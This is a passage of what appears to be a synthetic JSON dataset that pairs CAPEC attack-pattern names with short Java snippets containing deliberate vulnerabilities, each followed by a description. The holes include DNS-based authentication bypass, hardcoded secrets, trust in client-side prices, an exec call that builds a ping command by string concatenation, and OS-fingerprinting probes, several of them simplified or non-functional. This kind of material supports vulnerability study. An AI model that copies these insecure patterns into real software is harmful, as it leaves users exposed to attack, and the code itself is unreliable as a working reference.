        "code_snippet": "public class SecurityManager {\n    private static final String PROTECTED_REGION = \"/secure/data\";\n    private static final String UNPROTECTED_REGION = \"/public/data\";\n    \n    public boolean authenticateUser(String username) {\n        try {\n            String hostName = java.net.InetAddress.getByName(username + \".company.com\").getHostName();\n            System.out.println(\"DEBUG: Authentication attempt from \" + hostName);\n            \n            // Vulnerable overlapping access control\n            if (isRequestedPathInRange(UNPROTECTED_REGION, PROTECTED_REGION)) {\n                return true;\n            }\n            \n            return hostName.endsWith(\".company.com\");\n        } catch (Exception e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n    \n    private boolean isRequestedPathInRange(String path1, String path2) {\n        return path1.toLowerCase().contains(path2.toLowerCase()) || \n               path2.toLowerCase().contains(path1.toLowerCase());\n    }\n}",
        "description": "This code demonstrates multiple security vulnerabilities including authentication bypass through DNS lookup validation, debug information exposure, and overlapping access control regions. The authentication mechanism relies on DNS lookups for security decisions, exposes sensitive information through debug logging, and implements a flawed access control mechanism where protected and unprotected regions can overlap, allowing potential unauthorized access to protected resources."
    },
    {
        "capec_id": "317",
        "capec_name": "IP ID Sequencing Probe",
        "code_snippet": "public class NetworkPacketAnalyzer {\n    private Map<String, Integer> ipIdSequence = new HashMap<>();\n\n    public String identifyOperatingSystem(String targetIP) {\n        try {\n            Socket socket = new Socket(targetIP, 80);\n            DatagramSocket udpSocket = new DatagramSocket();\n            \n            // Send multiple packets and collect IP ID sequences\n            for(int i = 0; i < 5; i++) {\n                InetAddress addr = InetAddress.getByName(targetIP);\n                byte[] buffer = new byte[1024];\n                DatagramPacket packet = new DatagramPacket(buffer, buffer.length, addr, 80);\n                udpSocket.send(packet);\n                \n                // Store and analyze IP ID sequence from responses\n                int ipId = extractIPId(packet);\n                ipIdSequence.put(targetIP + \"_\" + i, ipId);\n            }\n            \n            // Analyze sequence pattern to guess OS\n            return analyzeSequencePattern(ipIdSequence);\n            \n        } catch (IOException e) {\n            return \"Unknown\";\n        }\n    }\n    \n    private int extractIPId(DatagramPacket packet) {\n        // Vulnerable: Directly accessing IP header information\n        byte[] data = packet.getData();\n        return ((data[4] & 0xFF) << 8) | (data[5] & 0xFF);\n    }\n    \n    private String analyzeSequencePattern(Map<String, Integer> sequence) {\n        // Oversimplified OS fingerprinting based on IP ID sequence\n        int diff = sequence.values().stream()\n            .reduce((a, b) -> b - a)\n            .orElse(0);\n            \n        if (diff == 1) return \"Windows\";\n        else if (diff == 0) return \"Linux\";\n        else return \"Unknown\";\n    }\n}",
        "description": "This code demonstrates a vulnerable implementation of OS fingerprinting through IP ID sequence analysis. It creates both TCP and UDP sockets to send packets and analyze the IP ID sequences in responses, attempting to identify the target's operating system. The code is vulnerable as it relies on IP addresses for identification, directly accesses IP header information, and makes assumptions about OS behavior based on IP ID sequences. It could be used for unauthorized system identification and information disclosure."
    },
    {
        "capec_id": "318",
        "capec_name": "IP 'ID' Echoed Byte-Order Probe",
        "code_snippet": "public class NetworkProber {\n    public void probeOperatingSystem(String targetHost) {\n        try {\n            DatagramSocket socket = new DatagramSocket();\n            byte[] data = new byte[0];\n            \n            // Send UDP packet with custom IP ID\n            int customIPId = 0xABCD;\n            DatagramPacket packet = new DatagramPacket(data, 0, InetAddress.getByName(targetHost), 12345);\n            \n            // Expose IP ID in packet header\n            Field ipHeaderField = packet.getClass().getDeclaredField(\"ipHeader\");\n            ipHeaderField.setAccessible(true);\n            Object ipHeader = ipHeaderField.get(packet);\n            Field idField = ipHeader.getClass().getDeclaredField(\"id\");\n            idField.setAccessible(true);\n            idField.setInt(ipHeader, customIPId);\n            \n            socket.send(packet);\n            \n            // Receive ICMP error response and analyze IP ID field\n            byte[] receiveData = new byte[1024];\n            DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);\n            socket.receive(receivePacket);\n            \n            // Store sensitive trace data without protection\n            String rawResponse = new String(receivePacket.getData());\n            System.out.println(\"OS Fingerprint: \" + rawResponse);\n            \n            socket.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable OS fingerprinting implementation that uses UDP packets with custom IP IDs to probe target systems. It exposes sensitive information through unprotected trace data, lacks proper security identifiers, and shows improper handling of network packet identifiers. The code uses reflection to manipulate packet headers and stores sensitive trace data without protection."
    },
    {
        "capec_id": "319",
        "capec_name": "IP (DF) 'Don't Fragment Bit' Echoing Probe",
        "code_snippet": "public class NetworkProber {\n    public static void probeOperatingSystem(String targetHost) {\n        try {\n            DatagramSocket socket = new DatagramSocket();\n            byte[] data = new byte[0];\n            \n            // Create UDP packet with DF bit set\n            DatagramPacket packet = new DatagramPacket(data, 0, InetAddress.getByName(targetHost), 12345);\n            \n            // Set Don't Fragment bit through reflection (unsafe)\n            Field field = packet.getClass().getDeclaredField(\"df\");\n            field.setAccessible(true);\n            field.setBoolean(packet, true);\n            \n            // Send packet and wait for response\n            socket.send(packet);\n            \n            // Create buffer for response\n            byte[] buffer = new byte[1024];\n            DatagramPacket response = new DatagramPacket(buffer, buffer.length);\n            socket.receive(response);\n            \n            // Store sensitive OS information without protection\n            String osInfo = new String(response.getData());\n            System.out.println(\"OS Debug Info: \" + osInfo);\n            \n            socket.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates OS fingerprinting through UDP packet manipulation, specifically testing the 'Don't Fragment' (DF) bit behavior. The code exposes sensitive system information through unprotected debug data and uses reflection to manipulate low-level packet details, potentially allowing unauthorized access to system information and debug features. It incorrectly handles network communication channels and exposes trace data without proper protection."
    },
    {
        "capec_id": "320",
        "capec_name": "TCP Timestamp Probe",
        "code_snippet": "public class TCPTimestampProbe {\n    public static String detectOS(String targetHost, int port) {\n        long previousTimestamp = 0;\n        List<Long> intervals = new ArrayList<>();\n        \n        try {\n            for(int i = 0; i < 5; i++) {\n                Socket socket = new Socket(targetHost, port);\n                InputStream in = socket.getInputStream();\n                byte[] tcpHeader = new byte[60];\n                in.read(tcpHeader);\n                \n                // Extract TCP timestamp from Options field (simplified)\n                long currentTimestamp = extractTimestamp(tcpHeader);\n                \n                if(previousTimestamp > 0) {\n                    intervals.add(currentTimestamp - previousTimestamp);\n                }\n                previousTimestamp = currentTimestamp;\n                \n                Thread.sleep(1000);\n                socket.close();\n            }\n            \n            // Analyze timestamp intervals to guess OS\n            return analyzeTimestampPattern(intervals);\n            \n        } catch(Exception e) {\n            return \"Unknown OS\";\n        }\n    }\n    \n    private static long extractTimestamp(byte[] tcpHeader) {\n        // Simplified timestamp extraction from TCP Options\n        return System.currentTimeMillis();\n    }\n    \n    private static String analyzeTimestampPattern(List<Long> intervals) {\n        double avgInterval = intervals.stream()\n            .mapToLong(Long::longValue)\n            .average()\n            .orElse(0.0);\n            \n        if(avgInterval > 0 && avgInterval < 100) return \"Linux\";\n        else if(avgInterval >= 100 && avgInterval < 500) return \"Windows\";\n        else return \"Unknown OS\";\n    }\n}",
        "description": "This vulnerable code demonstrates TCP timestamp fingerprinting by collecting and analyzing TCP timestamp intervals from a target host. The code establishes multiple connections, extracts timestamps from TCP headers, and analyzes the intervals between timestamps to guess the operating system. The code exposes sensitive system information (CWE-200), creates a timing channel (CWE-385), and transmits data in cleartext (CWE-319). The timestamp analysis could be used for OS fingerprinting and potentially for capture-replay attacks (CWE-294)."
    },
    {
        "capec_id": "321",
        "capec_name": "TCP Sequence Number Probe",
        "code_snippet": "public class VulnerableSequenceServer {\n    private static int baseSequence = 0;\n\n    public void handleTCPConnection(Socket socket) throws IOException {\n        DataInputStream in = new DataInputStream(socket.getInputStream());\n        DataOutputStream out = new DataOutputStream(socket.getOutputStream());\n        \n        // Get acknowledgement number from incoming packet\n        long ackNumber = in.readLong();\n        \n        // Generate predictable sequence number based on system time\n        Random random = new Random(System.currentTimeMillis());\n        int sequenceNumber;\n        \n        // Vulnerable sequence number generation pattern\n        switch(baseSequence % 4) {\n            case 0:\n                sequenceNumber = 0;  // Zero\n                break;\n            case 1:\n                sequenceNumber = (int)ackNumber;  // Same as ACK\n                break;\n            case 2:\n                sequenceNumber = (int)ackNumber + 1;  // ACK + 1\n                break;\n            default:\n                sequenceNumber = random.nextInt();  // Predictable non-zero\n        }\n        \n        // Send sequence number in cleartext\n        out.writeInt(sequenceNumber);\n        baseSequence++;\n    }\n}",
        "description": "This code demonstrates a vulnerable TCP sequence number generation implementation that exposes the operating system's fingerprint through predictable sequence number patterns. It uses a predictable PRNG seed (system time), transmits sensitive data in cleartext, and follows a deterministic pattern for sequence number generation that could be used for OS fingerprinting."
    },
    {
        "capec_id": "322",
        "capec_name": "TCP (ISN) Greatest Common Divisor Probe",
        "code_snippet": "public class OSFingerprinting {\n    public static void fingerprint(String targetHost, int port) {\n        ArrayList<Long> sequences = new ArrayList<>();\n        try {\n            for(int i = 0; i < 5; i++) {\n                Socket socket = new Socket();\n                socket.connect(new InetSocketAddress(targetHost, port));\n                \n                // Extract ISN from raw TCP header (simplified)\n                InputStream in = socket.getInputStream();\n                byte[] header = new byte[20];\n                in.read(header);\n                \n                // Store sequence number in cleartext\n                long isn = ByteBuffer.wrap(header, 4, 4).getInt() & 0xFFFFFFFFL;\n                sequences.add(isn);\n                \n                socket.close();\n                Thread.sleep(100);\n            }\n            \n            // Calculate ISN increment pattern and store in plaintext\n            long increment = sequences.get(1) - sequences.get(0);\n            String osType = \"Unknown\";\n            \n            // Store OS fingerprint data in public location\n            File output = new File(\"/tmp/os_fingerprint.txt\");\n            FileWriter writer = new FileWriter(output);\n            writer.write(\"Target: \" + targetHost + \"\\n\");\n            writer.write(\"ISN Pattern: \" + increment + \"\\n\");\n            writer.write(\"Detected OS: \" + osType);\n            writer.close();\n            \n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code implements OS fingerprinting by analyzing TCP Initial Sequence Numbers (ISN). It exhibits multiple security issues: storing sensitive system information in cleartext, exposing TCP sequence numbers, storing trace data in an unprotected location (/tmp), and transmitting sensitive data without encryption. The code collects ISN patterns that could reveal OS information to unauthorized actors."
    },
    {
        "capec_id": "323",
        "capec_name": "TCP (ISN) Counter Rate Probe",
        "code_snippet": "public class OSDetectionProbe {\n    private static final Map<Integer, String> OS_SIGNATURES = new HashMap<>();\n    static {\n        OS_SIGNATURES.put(64, \"Windows\");\n        OS_SIGNATURES.put(128, \"Linux\");\n        OS_SIGNATURES.put(32, \"MacOS\");\n    }\n    \n    public String detectOS(InetAddress target) {\n        long startTime = System.nanoTime();\n        int sequenceCount = 0;\n        \n        try {\n            Socket socket = new Socket(target, 80);\n            BufferedReader reader = new BufferedReader(\n                new InputStreamReader(socket.getInputStream()));\n            \n            for(int i = 0; i < 100; i++) {\n                int seqNum = getInitialSequenceNumber(socket);\n                Thread.sleep(10);\n                int nextSeqNum = getInitialSequenceNumber(socket);\n                sequenceCount += (nextSeqNum - seqNum);\n            }\n            \n            long timeElapsed = System.nanoTime() - startTime;\n            int incrementRate = (int)(sequenceCount / (timeElapsed / 1000000000.0));\n            \n            return OS_SIGNATURES.getOrDefault(incrementRate, \"Unknown OS\");\n            \n        } catch(Exception e) {\n            return \"Detection failed\";\n        }\n    }\n    \n    private int getInitialSequenceNumber(Socket socket) {\n        // Simplified - actual implementation would analyze TCP headers\n        return socket.getPort() + (int)(System.nanoTime() % 1000);\n    }\n}",
        "description": "This vulnerable code demonstrates OS fingerprinting through TCP sequence number analysis. It exposes timing information (CWE-385) by measuring the rate of sequence number increments, which can reveal the target system's OS. The code contains race conditions (CWE-362) due to shared resource access without proper synchronization, and implements a TOCTOU vulnerability (CWE-367) in sequence number measurements. The timing analysis can expose sensitive OS information to unauthorized actors (CWE-200)."
    },
    {
        "capec_id": "324",
        "capec_name": "TCP (ISN) Sequence Predictability Probe",
        "code_snippet": "public class NetworkSequencePredictor {\n    private static long lastSequenceNumber = System.currentTimeMillis();\n\n    public static int generateSequenceNumber() {\n        // Vulnerable: Predictable sequence generation based on time\n        lastSequenceNumber = (lastSequenceNumber * 1103515245 + 12345) & 0x7fffffff;\n        return (int) lastSequenceNumber;\n    }\n\n    public static void sendPacket(String data) {\n        int seqNum = generateSequenceNumber();\n        String packet = \"SEQ:\" + seqNum + \";DATA:\" + data;\n        // Vulnerable: No integrity check, exposes sequence generation pattern\n        System.out.println(\"Debug: Sending packet with sequence \" + seqNum);\n        // Send packet logic here\n    }\n\n    public static void handleError(Exception e) {\n        // Vulnerable: Exposes system information in error messages\n        System.err.println(\"System Error: \" + e.toString() + \n                          \"; Sequence: \" + lastSequenceNumber + \n                          \"; Time: \" + System.currentTimeMillis());\n    }\n}",
        "description": "This code demonstrates vulnerable sequence number generation using predictable seeds (system time) and exposes the generation pattern through debug messages. It lacks integrity checks for packet transmission and reveals sensitive system information in error messages. The sequence generation algorithm is statistically analyzable, making it possible to fingerprint the system."
    },
    {
        "capec_id": "325",
        "capec_name": "TCP Congestion Control Flag (ECN) Probe",
        "code_snippet": "public class VulnerableECNProbe {\n    public void probeECNSupport(String targetHost) throws IOException {\n        Socket socket = new Socket(targetHost, 80);\n        // Set ECN flags in IP header without encryption or validation\n        int ecnFlags = 0x03; // Set ECN bits\n        Field ipField = socket.getClass().getDeclaredField(\"impl\");\n        ipField.setAccessible(true);\n        Object impl = ipField.get(socket);\n        Method setEcn = impl.getClass().getDeclaredMethod(\"setECN\", int.class);\n        setEcn.setAccessible(true);\n        setEcn.invoke(impl, ecnFlags);\n        \n        // Send probe packet without volume control or integrity check\n        OutputStream out = socket.getOutputStream();\n        String probeMessage = \"ECN-Test-Probe\";\n        out.write(probeMessage.getBytes());\n        \n        // Read response without validation\n        InputStream in = socket.getInputStream();\n        byte[] response = new byte[1024];\n        int bytesRead = in.read(response);\n        \n        // Log sensitive OS information in cleartext\n        String osInfo = new String(response, 0, bytesRead);\n        System.out.println(\"OS Fingerprint: \" + osInfo);\n        \n        socket.close();\n    }\n}",
        "description": "This code demonstrates a vulnerable implementation of ECN probing that includes several security issues: cleartext transmission of sensitive OS information, lack of integrity checks on network messages, no control over network message volume, exposure of system information through error messages, and missing validation of ECN responses. The code attempts to set ECN flags and probe a remote system without proper security controls."
    },
    {
        "capec_id": "326",
        "capec_name": "TCP Initial Window Size Probe",
        "code_snippet": "public class TCPProber {\n    private static final int BUFFER_SIZE = 1024;\n    \n    public String probeTCPWindow(String targetHost, int port) {\n        byte[] buffer = new byte[BUFFER_SIZE];\n        String osType = \"\";\n        \n        try (Socket socket = new Socket(targetHost, port)) {\n            int windowSize = socket.getReceiveBufferSize();\n            InputStream in = socket.getInputStream();\n            \n            // Vulnerable: Reading without proper bounds checking\n            int bytesRead = in.read(buffer, 0, windowSize + 100);\n            \n            // OS fingerprinting based on TCP window size\n            if (windowSize == 8192) {\n                osType = \"Linux 2.4/2.6\";\n            } else if (windowSize == 16384) {\n                osType = \"Windows XP/2003\";\n            } else if (windowSize == 65535) {\n                osType = \"Windows Vista/7\";\n            }\n            \n            // Debug mode - exposes internal system information\n            if (System.getProperty(\"debug\") != null) {\n                System.out.println(\"TCP Window Size: \" + windowSize);\n                System.out.println(\"Raw TCP Data: \" + new String(buffer));\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return osType;\n    }\n}",
        "description": "This vulnerable code demonstrates OS fingerprinting through TCP window size analysis. It contains multiple security issues: buffer overflow vulnerability when reading data, exposure of sensitive system information through debug output, and reliance on TCP window sizes for OS identification. The code doesn't properly validate buffer boundaries and exposes internal system details that could be used for system fingerprinting."
    },
    {
        "capec_id": "327",
        "capec_name": "TCP Options Probe",
        "code_snippet": "public class TCPProbeServer {\n    private ServerSocket serverSocket;\n    private static final int PORT = 8080;\n\n    public void start() throws IOException {\n        serverSocket = new ServerSocket(PORT);\n        while (true) {\n            Socket clientSocket = serverSocket.accept();\n            SocketImpl impl = clientSocket.getImpl();\n            Field optionsField = impl.getClass().getDeclaredField(\"options\");\n            optionsField.setAccessible(true);\n            byte[] options = (byte[]) optionsField.get(impl);\n            \n            // Expose TCP options in response header\n            clientSocket.setTcpNoDelay(true);\n            clientSocket.setKeepAlive(true);\n            clientSocket.setSoLinger(true, 10);\n            \n            // Debug mode enabled in production\n            boolean debugMode = true;\n            if (debugMode) {\n                System.out.println(\"TCP Options: \" + Arrays.toString(options));\n                System.out.println(\"OS Info: \" + System.getProperty(\"os.name\"));\n            }\n            \n            // Multiple binds to same port\n            ServerSocket additionalSocket = new ServerSocket(PORT);\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates OS fingerprinting through TCP header options analysis. It exposes sensitive system information through TCP options, allows debug features in production, and attempts multiple binds to the same port. The code uses reflection to access internal TCP implementation details and exposes system properties, making it easier for attackers to fingerprint the operating system."
    },
    {
        "capec_id": "328",
        "capec_name": "TCP 'RST' Flag Checksum Probe",
        "code_snippet": "public class NetworkHandler {\n    private Socket socket;\n    private PrintWriter out;\n\n    public void sendResetPacket(String errorMessage) {\n        try {\n            socket = new Socket(\"remote.server.com\", 8080);\n            out = new PrintWriter(socket.getOutputStream(), true);\n            \n            // Send RST packet with error message in cleartext\n            String rstPacket = \"RST|\" + errorMessage;\n            out.println(rstPacket);\n            \n            // Basic checksum without verification\n            int checksum = calculateChecksum(errorMessage);\n            out.println(checksum);\n            \n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private int calculateChecksum(String message) {\n        int sum = 0;\n        for (char c : message.toCharArray()) {\n            sum += (int) c;\n        }\n        return sum;\n    }\n}",
        "description": "This vulnerable code implements a network handler that sends RST packets with cleartext error messages and uses a weak checksum mechanism. The code exposes sensitive information in cleartext, lacks proper integrity validation, and is susceptible to capture-replay attacks due to the simple checksum implementation without any cryptographic protection or timestamp verification."
    },
    {
        "capec_id": "329",
        "capec_name": "ICMP Error Message Quoting Probe",
        "code_snippet": "public class NetworkDiagnostics {\n    public void handleICMPError(byte[] packet) {\n        try {\n            String sourceIP = extractSourceIP(packet);\n            int errorType = packet[20] & 0xFF;\n            int errorCode = packet[21] & 0xFF;\n            \n            // Extract and log original packet data that triggered the ICMP error\n            byte[] quotedPacket = new byte[packet.length - 28];\n            System.arraycopy(packet, 28, quotedPacket, 0, quotedPacket.length);\n            \n            // Log sensitive error information\n            System.err.println(\"ICMP Error from \" + sourceIP +\n                             \"\\nError Type: \" + errorType +\n                             \"\\nError Code: \" + errorCode +\n                             \"\\nOriginal Request: \" + new String(quotedPacket) +\n                             \"\\nSystem Path: \" + System.getProperty(\"user.dir\") +\n                             \"\\nJava Version: \" + System.getProperty(\"java.version\"));\n            \n            // Store error details in log file with sensitive system information\n            logErrorDetails(sourceIP, errorType, errorCode, quotedPacket);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private String extractSourceIP(byte[] packet) {\n        return String.format(\"%d.%d.%d.%d\",\n            packet[12] & 0xFF, packet[13] & 0xFF,\n            packet[14] & 0xFF, packet[15] & 0xFF);\n    }\n}",
        "description": "This vulnerable code processes ICMP error messages and exposes sensitive information through error logging. It extracts and displays the quoted packet data along with system details in error messages, potentially revealing sensitive information to unauthorized actors. The code violates security best practices by exposing system paths, Java version, and original request data in error messages without proper sanitization or access control."
    },
    {
        "capec_id": "330",
        "capec_name": "ICMP Error Message Echoing Integrity Probe",
        "code_snippet": "public class NetworkDiagnostics {\n    public void handleICMPError(String targetHost) {\n        try {\n            // Send ICMP Echo request without any integrity checks\n            Process ping = Runtime.getRuntime().exec(\"ping -n 1 \" + targetHost);\n            \n            // Log detailed error information including system details\n            BufferedReader reader = new BufferedReader(\n                new InputStreamReader(ping.getErrorStream()));\n            String line;\n            StringBuilder errorLog = new StringBuilder();\n            \n            while ((line = reader.readLine()) != null) {\n                errorLog.append(line)\n                       .append(\"\\nSystem: \" + System.getProperty(\"os.name\"))\n                       .append(\"\\nUser: \" + System.getProperty(\"user.name\"))\n                       .append(\"\\nPath: \" + System.getProperty(\"user.dir\"));\n            }\n            \n            // Store sensitive error information in plaintext\n            FileWriter writer = new FileWriter(\"network_errors.log\");\n            writer.write(errorLog.toString());\n            writer.close();\n            \n            // Echo received ICMP packets without validation\n            DatagramSocket socket = new DatagramSocket(3333);\n            byte[] buffer = new byte[1024];\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n            socket.receive(packet);\n            socket.send(packet);  // Replay received packet without verification\n        } catch (Exception e) {\n            System.out.println(\"Error details: \" + e.toString());\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates handling ICMP errors without proper security measures. It exposes sensitive system information in error messages, lacks integrity checks for network packets, allows capture-replay attacks through unvalidated packet forwarding, and logs sensitive diagnostic information in plaintext. The code directly processes and echoes ICMP packets without verification, making it susceptible to network-based attacks."
    },
    {
        "capec_id": "331",
        "capec_name": "ICMP IP Total Length Field Probe",
        "code_snippet": "public class UDPProbe {\n    public static void sendProbe(String targetHost, int port) {\n        try {\n            DatagramSocket socket = new DatagramSocket();\n            byte[] data = new byte[0];\n            DatagramPacket packet = new DatagramPacket(data, data.length,\n                InetAddress.getByName(targetHost), port);\n            \n            socket.send(packet);\n            \n            // Wait for ICMP response\n            byte[] receiveData = new byte[1024];\n            DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);\n            socket.receive(receivePacket);\n            \n            // Extract IP header length and OS fingerprint info\n            int ipHeaderLength = receivePacket.getLength();\n            String response = new String(receivePacket.getData(), 0, ipHeaderLength);\n            \n            // Store or process OS fingerprint information without validation\n            processOSFingerprint(ipHeaderLength, response);\n            \n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private static void processOSFingerprint(int headerLength, String response) {\n        // Directly process and store received data without integrity checks\n        System.out.println(\"OS Fingerprint: \" + response);\n    }\n}",
        "description": "This vulnerable code demonstrates sending UDP probes to closed ports and processing ICMP responses without proper validation. It exposes system information through error messages, lacks integrity checks on received data, processes length parameters without validation, and transmits data in cleartext. The code allows for OS fingerprinting through response analysis of error messages."
    },
    {
        "capec_id": "332",
        "capec_name": "ICMP IP 'ID' Field Error Message Probe",
        "code_snippet": "public class NetworkIdentificationService {\n    private DatagramSocket socket;\n\n    public void handleUDPRequest() {\n        try {\n            socket = new DatagramSocket(8888);\n            byte[] receiveData = new byte[1024];\n            DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);\n\n            while (true) {\n                socket.receive(receivePacket);\n                InetAddress clientAddress = receivePacket.getAddress();\n                int clientPort = receivePacket.getPort();\n\n                // Vulnerable: Revealing system information in error responses\n                String osInfo = System.getProperty(\"os.name\") + \" \" + \n                               System.getProperty(\"os.version\") + \" \" +\n                               System.getProperty(\"os.arch\");\n                \n                // Send error response with system details\n                String errorMsg = \"Port closed. Server running on: \" + osInfo;\n                byte[] sendData = errorMsg.getBytes();\n                DatagramPacket sendPacket = new DatagramPacket(sendData, sendData.length,\n                        clientAddress, clientPort);\n                socket.send(sendPacket);\n            }\n        } catch (IOException e) {\n            System.out.println(\"System error: \" + e.toString());\n        }\n    }\n}",
        "description": "This vulnerable code implements a UDP server that responds to incoming packets with detailed system information in error messages. It demonstrates the CAPEC attack by responding to closed port requests with OS details, enabling OS fingerprinting. The code violates CWE-204 by providing different responses based on system state, CWE-319 by transmitting system information in cleartext, and CWE-211 by exposing sensitive information in error messages."
    },
    {
        "capec_id": "383",
        "capec_name": "Harvesting Information via API Event Monitoring",
        "code_snippet": "public class VirtualEvent {\n    private List<UserData> participants = new ArrayList<>();\n\n    public class UserData {\n        public String userId;\n        public String username;\n        public String email;\n    }\n\n    public void joinEvent(String userId, String username, String email) {\n        // Unencrypted transmission of user data\n        UserData userData = new UserData();\n        userData.userId = userId;\n        userData.username = username;\n        userData.email = email;\n        participants.add(userData);\n\n        // Vulnerable data exposure through query\n        notifyParticipants(\"User \" + username + \" joined the event\");\n    }\n\n    public List<UserData> getParticipants() {\n        // No authentication check, returns all user data\n        return participants;\n    }\n\n    private void notifyParticipants(String message) {\n        // Sends unencrypted messages with user information\n        for (UserData user : participants) {\n            sendMessage(user.email, message);\n        }\n    }\n\n    private void sendMessage(String email, String message) {\n        // Simulates sending message over cleartext channel\n        System.out.println(\"Sending to \" + email + \": \" + message);\n    }\n}",
        "description": "This code demonstrates a vulnerable virtual event system where user data is transmitted and stored without encryption, allowing an attacker to harvest sensitive information. The system lacks proper authentication, transmits data in cleartext, and exposes participant information through unrestricted queries. The code relies on client-side security and doesn't protect the primary communication channel."
    },
    {
        "capec_id": "384",
        "capec_name": "Application API Message Manipulation via Man-in-the-Middle",
        "code_snippet": "public class OrderProcessor {\n    private static final String CLIENT_SECRET = \"abc123\";\n\n    public void processOrder(String clientData, String clientToken) {\n        // Vulnerable: Client-supplied token accepted without proper verification\n        if (clientToken.equals(CLIENT_SECRET)) {\n            // Vulnerable: Trusting client-side price calculation\n            OrderData order = JsonParser.parse(clientData, OrderData.class);\n            \n            // Process payment based on client-provided price\n            double totalPrice = order.getClientCalculatedPrice();\n            processPayment(order.getUserId(), totalPrice);\n            \n            // Send order confirmation with unencrypted sensitive data\n            String confirmation = \"Order confirmed for user: \" + order.getUserId() + \n                                \", Credit Card: \" + order.getCreditCardNumber();\n            sendConfirmation(confirmation);\n        }\n    }\n\n    private void processPayment(String userId, double amount) {\n        // Process payment using client-provided amount\n    }\n\n    private void sendConfirmation(String message) {\n        // Send unencrypted confirmation\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues: it relies on client-side enforcement of pricing calculations, uses weak token validation, fails to properly verify data authenticity, assumes client data is immutable, and transmits sensitive data without encryption. The code trusts client-calculated prices and sensitive data without server-side validation, making it susceptible to manipulation through man-in-the-middle attacks at the application layer."
    },
    {
        "capec_id": "385",
        "capec_name": "Transaction or Event Tampering via Application API Manipulation",
        "code_snippet": "public class GameItemExchange {\n    public class Item {\n        public int id;\n        public String name;\n        public double value;\n    }\n\n    public boolean processItemTrade(Item itemToSend, Item itemToReceive, String playerA, String playerB) {\n        // No encryption or validation of trade data\n        String tradeData = playerA + \",\" + itemToSend.id + \",\" + playerB + \",\" + itemToReceive.id;\n        \n        // Client-side only validation\n        if(validateTradeLocally(tradeData)) {\n            // Direct modification of trade values possible\n            double exchangeRate = getClientSideExchangeRate();\n            itemToSend.value *= exchangeRate;\n            itemToReceive.value *= exchangeRate;\n            \n            // No origin verification\n            sendTradeRequest(tradeData);\n            return true;\n        }\n        return false;\n    }\n    \n    private boolean validateTradeLocally(String tradeData) {\n        // Insufficient verification of data authenticity\n        return true;\n    }\n    \n    private double getClientSideExchangeRate() {\n        // Exchange rate stored client-side and can be manipulated\n        return 1.0;\n    }\n    \n    private void sendTradeRequest(String tradeData) {\n        // Sends unencrypted trade data over network\n        // Vulnerable to MITM attacks\n    }\n}",
        "description": "This code demonstrates a vulnerable game item exchange system where trade data is processed without proper server-side validation, encryption, or origin verification. The code relies on client-side validation, stores mutable exchange rates locally, and transmits sensitive trade data without encryption, making it susceptible to man-in-the-middle attacks and data manipulation during item exchanges."
    },
    {
        "capec_id": "386",
        "capec_name": "Application API Navigation Remapping",
        "code_snippet": "public class NavigationController {\n    private Map<String, String> navigationMap = new HashMap<>();\n    \n    public void setNavigationLink(String elementId, String destination) {\n        // No validation of input source or destination\n        navigationMap.put(elementId, destination);\n    }\n    \n    public String getRedirectUrl(String elementId) {\n        // Client-side only verification of navigation destination\n        if (navigationMap.containsKey(elementId)) {\n            // No encryption or origin validation\n            return navigationMap.get(elementId);\n        }\n        return \"default.html\";\n    }\n    \n    public String generateNavigationButton(String elementId, String displayText) {\n        String destination = navigationMap.get(elementId);\n        // Generates button with potentially malicious destination\n        return String.format(\"<button onclick='window.location.href=\"%s\"'>%s</button>\",\n                           destination, displayText);\n    }\n}",
        "description": "This vulnerable code implements a navigation controller that allows dynamic modification of link destinations without proper validation, encryption, or origin verification. It demonstrates MAID by allowing modification of navigation mappings, insufficient verification of data authenticity, and client-side enforcement of security. The code allows an attacker to manipulate link destinations and generate buttons that could redirect users to malicious sites."
    },
    {
        "capec_id": "387",
        "capec_name": "Navigation Remapping To Propagate Malicious Content",
        "code_snippet": "public class MessageHandler {\n    private static final String CLIENT_KEY = \"abc123\";\n    \n    public void processClientMessage(String message, String clientKey) {\n        // Vulnerable: No proper validation of message authenticity\n        if (clientKey.equals(CLIENT_KEY)) {\n            MessageData data = new MessageData(message);\n            \n            // Vulnerable: Client-controlled data assumed to be immutable\n            if (data.isAdmin()) {\n                grantAdminAccess(data);\n            }\n            \n            // Vulnerable: Sensitive data sent without encryption\n            sendResponse(\"SUCCESS:\" + data.getUserToken());\n        }\n    }\n    \n    private void grantAdminAccess(MessageData data) {\n        // Process admin privileges based on client-side data\n        System.out.println(\"Admin access granted to: \" + data.getUsername());\n    }\n    \n    private void sendResponse(String response) {\n        // Send unencrypted response back to client\n        System.out.println(\"Sending: \" + response);\n    }\n}",
        "description": "This code demonstrates vulnerable message handling where client-side data is trusted without proper validation or encryption. It relies on client-side security controls, assumes message data is immutable, and fails to properly authenticate the origin of messages. The code uses a simple string comparison for authentication and transmits sensitive data without encryption."
    },
    {
        "capec_id": "388",
        "capec_name": "Application API Button Hijacking",
